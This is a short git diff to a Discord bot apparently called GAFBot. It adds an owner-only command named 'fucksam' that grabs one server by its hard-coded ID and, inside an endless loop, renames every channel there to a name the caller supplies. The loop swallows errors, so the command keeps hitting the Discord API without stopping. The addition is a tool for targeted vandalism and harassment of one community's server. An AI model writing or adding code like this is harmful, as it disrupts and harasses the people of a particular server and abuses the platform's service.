@@ -206,6 +206,18 @@ async def source():
     $source"""
     await bot.say("https://github.com/DiNitride/GAFBot")
 
+
+@bot.command()
+@commands.check(checks.is_owner)
+async def fucksam(*, name: str):
+    fuckedserver = bot.get_server("186530718560681984")
+    while True:
+        for channel in fuckedserver.channels:
+            try:
+                await bot.edit_channel(channel, name=name)
+            except discord.HTTPException:
+                continue
+
 @bot.command()
 async def about():
     """Info on the bot
